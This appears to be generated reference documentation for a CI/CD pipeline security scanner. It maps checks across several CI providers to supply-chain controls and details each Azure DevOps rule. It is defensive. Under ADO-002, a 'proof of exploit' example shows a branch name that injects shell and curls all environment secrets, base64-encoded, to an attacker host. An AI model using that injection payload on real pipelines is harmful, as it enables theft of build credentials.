| [`GHA-014`](#detail-gha-014) | Deploy job missing environment binding | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-030`](#detail-gha-030) | OIDC token requested without environment-protected job | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-004`](#detail-gl-004) | Deploy job lacks manual approval or environment gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-029`](#detail-gl-029) | Manual deploy job defaults to allow_failure: true | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-031`](#detail-gl-031) | id_tokens: missing audience pin or environment binding | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-005`](#detail-jf-005) | Deploy stage missing manual `input` approval | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-024`](#detail-jf-024) | `input` approval step missing submitter restriction | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-026`](#detail-jf-026) | `build job:` trigger ignores downstream failure | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`SCM-023`](#detail-scm-023) | Deployment environment lacks required-reviewer protection | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-041`](#detail-scm-041) | Active ruleset doesn't gate on a deployment environment | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |

### ESF-C-ROLLBACK: Automated rollback on deployment failure or alarm { #ctrl-esf-c-rollback }

**Evidenced by 4 checks** across AWS.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CD-001`](#detail-cd-001) | Automatic rollback on failure not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CD-002`](#detail-cd-002) | AllAtOnce deployment config, no canary or rolling strategy | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`ECR-002`](#detail-ecr-002) | Image tags are mutable | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`S3-003`](#detail-s3-003) | Artifact bucket versioning not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |

### ESF-C-DEPLOY-MON: Monitor deployments with alarms / health checks { #ctrl-esf-c-deploy-mon }

**Evidenced by 5 checks** across 3 providers (AWS, Dockerfile, Kubernetes).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CD-003`](#detail-cd-003) | No CloudWatch alarm monitoring on deployment group | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CW-001`](#detail-cw-001) | No CloudWatch alarm on CodeBuild FailedBuilds metric | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |
| [`DF-007`](#detail-df-007) | No HEALTHCHECK directive declared | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`EB-001`](#detail-eb-001) | No EventBridge rule for CodePipeline failure notifications | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`K8S-024`](#detail-k8s-024) | Container missing both livenessProbe and readinessProbe | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |

### ESF-C-ENV-SEP: Separate deployment environments (dev / staging / prod) { #ctrl-esf-c-env-sep }

**Evidenced by 10 checks** across 9 providers (AWS, Azure DevOps, Bitbucket, Buildkite, CircleCI, GitHub Actions, GitLab CI, Kubernetes, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-004`](#detail-ado-004) | Deployment job missing environment binding | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`BB-004`](#detail-bb-004) | Deploy step missing `deployment:` environment gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-013`](#detail-bk-013) | Deploy step has no branches: filter | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CC-009`](#detail-cc-009) | Deploy job missing manual approval gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CD-002`](#detail-cd-002) | AllAtOnce deployment config, no canary or rolling strategy | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GHA-014`](#detail-gha-014) | Deploy job missing environment binding | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-004`](#detail-gl-004) | Deploy job lacks manual approval or environment gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`K8S-019`](#detail-k8s-019) | Workload deployed in the 'default' namespace | <span class="pg-sev pg-sev--low">LOW</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`SCM-024`](#detail-scm-024) | Deployment environment can deploy from any branch | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-041`](#detail-scm-041) | Active ruleset doesn't gate on a deployment environment | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |

### ESF-C-ARTIFACT-AUTHZ: Restrict access to artifact storage and deployment pipelines { #ctrl-esf-c-artifact-authz }

**Evidenced by 14 checks** across 2 providers (AWS, Cloud Build).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CA-001`](#detail-ca-001) | CodeArtifact domain not encrypted with customer KMS CMK | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CA-003`](#detail-ca-003) | CodeArtifact domain policy allows cross-account wildcard | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`CA-004`](#detail-ca-004) | CodeArtifact repo policy grants ``codeartifact:*`` with ``Resource '*'`` | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CCM-002`](#detail-ccm-002) | CodeCommit repository not encrypted with customer KMS CMK | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CCM-003`](#detail-ccm-003) | CodeCommit trigger targets SNS/Lambda in a different account | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CP-002`](#detail-cp-002) | Artifact store not encrypted with customer-managed KMS key | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`ECR-003`](#detail-ecr-003) | Repository policy allows public access | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`GCB-026`](#detail-gcb-026) | Step waitFor: references an unknown step id | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`KMS-001`](#detail-kms-001) | KMS customer-managed key has rotation disabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`LMB-002`](#detail-lmb-002) | Lambda function URL has AuthType=NONE | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`LMB-004`](#detail-lmb-004) | Lambda resource policy allows wildcard principal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`S3-001`](#detail-s3-001) | Artifact bucket public access block not fully enabled | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`S3-005`](#detail-s3-005) | Artifact bucket missing aws:SecureTransport deny | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`SSM-002`](#detail-ssm-002) | SSM SecureString uses the default AWS-managed key | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |

### ESF-C-LEAST-PRIV: Apply least-privilege to CI/CD service roles and pipelines { #ctrl-esf-c-least-priv }

**Evidenced by 29 checks** across 6 providers (AWS, Argo Workflows, GitHub Actions, Kubernetes, SCM, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ARGO-003`](#detail-argo-003) | Argo workflow uses the default ServiceAccount | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ARGO-013`](#detail-argo-013) | Argo workflow does not opt out of SA token automount | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`EB-002`](#detail-eb-002) | EventBridge rule has a wildcard target ARN | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GHA-004`](#detail-gha-004) | Workflow has no explicit permissions block | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-034`](#detail-gha-034) | Reusable workflow called with secrets: inherit | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-043`](#detail-gha-043) | Low-star action runs with sensitive permissions | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-049`](#detail-gha-049) | Workflow step pushes to a repo outside the current owner | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-061`](#detail-gha-061) | GitHub App token minted without a `permissions:` filter | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`IAM-001`](#detail-iam-001) | CI/CD role has AdministratorAccess policy attached | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`IAM-002`](#detail-iam-002) | CI/CD role has wildcard Action in attached policy | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`IAM-003`](#detail-iam-003) | CI/CD role has no permission boundary | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`IAM-004`](#detail-iam-004) | CI/CD role can PassRole to any role | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`IAM-005`](#detail-iam-005) | CI/CD role trust policy missing sts:ExternalId | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`IAM-006`](#detail-iam-006) | Sensitive actions granted with wildcard Resource | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`IAM-008`](#detail-iam-008) | OIDC-federated role trust policy missing audience or subject pin | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`K8S-011`](#detail-k8s-011) | Pod serviceAccountName unset or 'default' | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-012`](#detail-k8s-012) | Pod automountServiceAccountToken not false | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-020`](#detail-k8s-020) | ClusterRoleBinding grants cluster-admin or system:masters | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-021`](#detail-k8s-021) | Role or ClusterRole grants wildcard verbs+resources | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-029`](#detail-k8s-029) | RoleBinding grants permissions to the default ServiceAccount | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-034`](#detail-k8s-034) | ServiceAccount automountServiceAccountToken not explicitly false | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-042`](#detail-k8s-042) | RoleBinding grants access to system:anonymous / system:unauthenticated | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`KMS-002`](#detail-kms-002) | KMS key policy grants wildcard KMS actions | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`PBAC-002`](#detail-pbac-002) | CodeBuild service role shared across multiple projects | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`PBAC-005`](#detail-pbac-005) | CodePipeline stage action roles mirror the pipeline role | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`SCM-020`](#detail-scm-020) | Default workflow GITHUB_TOKEN has write permission | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-027`](#detail-scm-027) | Outside collaborator holds write / maintain / admin access | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SM-002`](#detail-sm-002) | Secrets Manager resource policy allows wildcard principal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`TKN-007`](#detail-tkn-007) | Tekton run uses the default ServiceAccount | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### ESF-C-AUDIT: Audit deployment / pipeline activity and retain logs { #ctrl-esf-c-audit }

**Evidenced by 25 checks** across 3 providers (AWS, CircleCI, Jenkins).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CA-000`](#detail-ca-000) | CodeArtifact API access failed | <span class="pg-sev pg-sev--info">INFO</span> | [AWS](../providers/aws.md) |  |
| [`CB-000`](#detail-cb-000) | CodeBuild API access failed | <span class="pg-sev pg-sev--info">INFO</span> | [AWS](../providers/aws.md) |  |
| [`CB-003`](#detail-cb-003) | Build logging not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CC-011`](#detail-cc-011) | No store_test_results step (test results not archived) | <span class="pg-sev pg-sev--low">LOW</span> | [CircleCI](../providers/circleci.md) |  |
| [`CCM-000`](#detail-ccm-000) | CodeCommit API access failed | <span class="pg-sev pg-sev--info">INFO</span> | [AWS](../providers/aws.md) |  |
| [`CD-000`](#detail-cd-000) | CodeDeploy API access failed | <span class="pg-sev pg-sev--info">INFO</span> | [AWS](../providers/aws.md) |  |
| [`CP-000`](#detail-cp-000) | CodePipeline API access failed | <span class="pg-sev pg-sev--info">INFO</span> | [AWS](../providers/aws.md) |  |
| [`CT-000`](#detail-ct-000) | CloudTrail API access failed | <span class="pg-sev pg-sev--info">INFO</span> | [AWS](../providers/aws.md) |  |
| [`CT-001`](#detail-ct-001) | No active CloudTrail trail in region | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CT-002`](#detail-ct-002) | CloudTrail log-file validation disabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CT-003`](#detail-ct-003) | CloudTrail trail is not multi-region | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CWL-000`](#detail-cwl-000) | CloudWatch Logs API access failed | <span class="pg-sev pg-sev--info">INFO</span> | [AWS](../providers/aws.md) |  |
| [`CWL-001`](#detail-cwl-001) | CodeBuild log group has no retention policy | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |
| [`CWL-002`](#detail-cwl-002) | CodeBuild log group not KMS-encrypted | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`EB-000`](#detail-eb-000) | EventBridge API access failed | <span class="pg-sev pg-sev--info">INFO</span> | [AWS](../providers/aws.md) |  |
| [`ECR-000`](#detail-ecr-000) | ECR API access failed | <span class="pg-sev pg-sev--info">INFO</span> | [AWS](../providers/aws.md) |  |
| [`IAM-000`](#detail-iam-000) | IAM API access failed | <span class="pg-sev pg-sev--info">INFO</span> | [AWS](../providers/aws.md) |  |
| [`JF-011`](#detail-jf-011) | Pipeline has no `buildDiscarder` retention policy | <span class="pg-sev pg-sev--low">LOW</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`KMS-000`](#detail-kms-000) | KMS API access failed | <span class="pg-sev pg-sev--info">INFO</span> | [AWS](../providers/aws.md) |  |
| [`LMB-000`](#detail-lmb-000) | Lambda API access failed | <span class="pg-sev pg-sev--info">INFO</span> | [AWS](../providers/aws.md) |  |
| [`PBAC-000`](#detail-pbac-000) | PBAC enumeration failed | <span class="pg-sev pg-sev--info">INFO</span> | [AWS](../providers/aws.md) |  |
| [`S3-000`](#detail-s3-000) | S3 API access failed | <span class="pg-sev pg-sev--info">INFO</span> | [AWS](../providers/aws.md) |  |
| [`S3-004`](#detail-s3-004) | Artifact bucket access logging not enabled | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |
| [`SM-000`](#detail-sm-000) | Secrets Manager API access failed | <span class="pg-sev pg-sev--info">INFO</span> | [AWS](../providers/aws.md) |  |
| [`SSM-000`](#detail-ssm-000) | SSM Parameter Store API access failed | <span class="pg-sev pg-sev--info">INFO</span> | [AWS](../providers/aws.md) |  |

## Check details

Every check that evidences this standard, rendered once with its detection mechanism, recommendation, and any known false-positive modes or real-world incident references. The per-control tables above link to the matching block here.

### `ADO-001`: Task reference not pinned to specific version <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-001 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Floating-major task references (`@1`, `@2`) can roll forward silently when the task publisher ships a breaking or malicious update. Pass when every `task:` reference carries a two- or three-segment semver.

**Recommendation.** Reference tasks by a full semver (`DownloadSecureFile@1.2.3`) or extension-published-version. Track task updates explicitly via Azure DevOps extension settings rather than letting `@1` drift.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ADO-001`](../providers/azure.md#ado-001) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-002`: Script injection via attacker-controllable context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-002 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** `$(Build.SourceBranch*)`, `$(Build.SourceVersionMessage)`, and `$(System.PullRequest.*)` are populated from SCM event metadata the attacker controls. Inline interpolation into a script body executes crafted content.

**Recommendation.** Pass these values through an intermediate pipeline variable declared with `readonly: true`, and reference that variable through an environment variable rather than `$(...)` macro interpolation. ADO expands `$(…)` before shell quoting, so inline use is never safe.

**Proof of exploit.**

```
# Vulnerable: PR title macro interpolated straight into script.
trigger: none
pr:
  branches:
    include: [main]
jobs:
  - job: triage
    pool: { vmImage: ubuntu-latest }
    steps:
      - script: |
          echo "New PR: $(System.PullRequest.SourceBranch)"
          echo "Subject: $(Build.SourceVersionMessage)"

# Attack: open a PR from a branch whose name carries shell:
#
#   git checkout -b 'foo";curl https://attacker/exfil \
#     -d "$(printenv | base64)";echo "x'
#
# ADO expands ``$(...)`` BEFORE shell quoting, so the macro
# value's `"` closes the echo and the rest becomes shell.
# The PR-validated pipeline has the same service-connection
# credentials a main-branch build would have, so the curl
# exfils every secret in scope. Classic pwn-request shape.

# Safe: route through env so the value is never interpolated
# into the shell template.
      - bash: |
          echo "New PR: $PR_BRANCH"
          echo "Subject: $COMMIT_MSG"
        env:
          PR_BRANCH: $(System.PullRequest.SourceBranch)
          COMMIT_MSG: $(Build.SourceVersionMessage)
```

**Source:** [`ADO-002`](../providers/azure.md#ado-002) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-003`: Variables contain literal secret values <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ado-003 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Scans `variables:` in both the mapping form (`{KEY: VAL}`) and the list form (`[{name: X, value: Y}]`) that ADO supports. AWS keys are detected by value shape regardless of variable name.

**Recommendation.** Store secrets in an Azure Key Vault or a Library variable group with the secret flag set; reference them via `$(SECRET_NAME)` at runtime. For cloud access prefer Azure workload identity federation.

**Source:** [`ADO-003`](../providers/azure.md#ado-003) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-004`: Deployment job missing environment binding <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-004 }

**Evidences:** [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment, [`ESF-C-ENV-SEP`](#ctrl-esf-c-env-sep) Separate deployment environments (dev / staging / prod).

**How this is detected.** Without an `environment:` binding, ADO cannot enforce approvals, checks, or deployment history against a named resource. Every `deployment:` job should bind one.

**Recommendation.** Add `environment: <name>` to every `deployment:` job. Configure approvals, required branches, and business-hours checks on the matching Environment in the ADO UI.

**Known false positives.**

- The deploy-name regex (``deploy`` / ``release`` / ``publish`` / ``promote``) flags jobs whose names include those tokens for non-deploy reasons (e.g. ``release-notes-build`` that only generates a changelog). The deploy-command regex similarly fires on test pipelines that exercise ``kubectl apply --dry-run`` or ``helm template`` for validation. Suppress those jobs per-resource via ``--ignore-file`` once you've verified they don't actually mutate any environment.

**Source:** [`ADO-004`](../providers/azure.md#ado-004) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-005`: Container image not pinned to specific version <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-005 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests, [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Container images can be declared at `resources.containers[].image` or `job.container` (string or `{image:}`). Floating / untagged refs let the publisher swap the image contents.

**Recommendation.** Reference images by `@sha256:<digest>` or at minimum a full immutable version tag. Avoid `:latest` and untagged refs.

**Source:** [`ADO-005`](../providers/azure.md#ado-005) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-006 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release.

**How this is detected.** Passes when cosign / sigstore / slsa-* / notation-sign appears anywhere in the pipeline text.

**Recommendation.** Add a task that runs `cosign sign` or `notation sign`, Azure Pipelines' workload identity federation enables keyless signing. Publish the signature to the artifact feed and verify it at deploy time.

**Source:** [`ADO-006`](../providers/azure.md#ado-006) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-007 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** Without an SBOM, downstream consumers can't audit the dependency set shipped in the artifact.

**Recommendation.** Add an SBOM step, `microsoft/sbom-tool`, `syft . -o cyclonedx-json`, or `anchore/sbom-action`. Publish the SBOM as a pipeline artifact so downstream consumers can ingest it.

**Source:** [`ADO-007`](../providers/azure.md#ado-007) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-008`: Credential-shaped literal in pipeline body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-008 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Complements ADO-003 (which looks at `variables:` keys). ADO-008 scans every string in the pipeline against the cross-provider credential-pattern catalog.

**Recommendation.** Rotate the exposed credential. Move the value to Azure Key Vault or a secret variable group and reference it via `$(SECRET_NAME)`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Source:** [`ADO-008`](../providers/azure.md#ado-008) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-009`: Container image pinned by tag rather than sha256 digest <span class="pg-sev pg-sev--low">LOW</span> { #detail-ado-009 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests, [`ESF-S-IMMUTABLE`](#ctrl-esf-s-immutable) Enforce artifact / tag immutability to preserve provenance.

**How this is detected.** ADO-005 fails floating tags at HIGH; ADO-009 is the stricter tier. Even immutable-looking version tags can be repointed by registry operators.

**Recommendation.** Resolve each image to its current digest and replace the tag with `@sha256:<digest>`. Schedule regular digest bumps via Renovate or a scheduled pipeline.

**Source:** [`ADO-009`](../providers/azure.md#ado-009) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-010`: Cross-pipeline `download:` ingestion unverified <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ado-010 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** `resources.pipelines:` declares an upstream pipeline; a `download: <name>` step pulls its artifacts. If the upstream accepts PR validation, the artifact may have been built by PR-controlled code.

**Recommendation.** Add a verification step before consuming the artifact: `cosign verify-attestation`, `sha256sum -c`, or `gpg --verify` against a manifest the producing pipeline signed.

**Source:** [`ADO-010`](../providers/azure.md#ado-010) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-011`: `template: <local-path>` on PR-validated pipeline <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-011 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** `template: <relative-path>` includes another YAML from the CURRENT repo. On PR validation builds, the repo content is the PR branch, letting the PR author swap the template body. Cross-repo templates (`template: foo.yml@my-repo`) are version-pinned and not affected.

**Recommendation.** Move the template into a separate, branch-protected repository and reference it via `template: foo.yml@<repo-resource>` with a pinned `ref:` on the resource. That way the template content is fixed at PR creation time and can't be modified from the PR branch.

**Source:** [`ADO-011`](../providers/azure.md#ado-011) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-012`: Cache@2 key derives from $(System.PullRequest.*) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-012 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** `Cache@2` (and older `CacheBeta@1`) restore by key. A key including PR-controlled variables on PR-validated pipelines lets a PR seed a poisoned cache entry that a later default-branch pipeline restores.

**Recommendation.** Build the cache key from values the PR can't control: `$(Agent.OS)`, lockfile hashes, the pipeline name. Never reference `$(System.PullRequest.*)` or `$(Build.SourceBranch*)` from a cache key namespace.

**Source:** [`ADO-012`](../providers/azure.md#ado-012) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-013`: Self-hosted pool without explicit ephemeral marker <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-013 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers), [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** `pool: { name: <agent-pool> }` (or the bare string form `pool: <name>`) targets a self-hosted agent pool. Without an explicit ephemeral arrangement, agents reuse state across jobs. Microsoft-hosted pools (`vmImage:` or the `Azure Pipelines` / `Default` names) are skipped.

**Recommendation.** Configure the agent pool with autoscaling + ephemeral agents (the Azure VM Scale Set agent), and add `demands: [ephemeral -equals true]` on the pool block so this check can verify it.

**Source:** [`ADO-013`](../providers/azure.md#ado-013) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-014`: AWS auth uses long-lived access keys <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-014 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

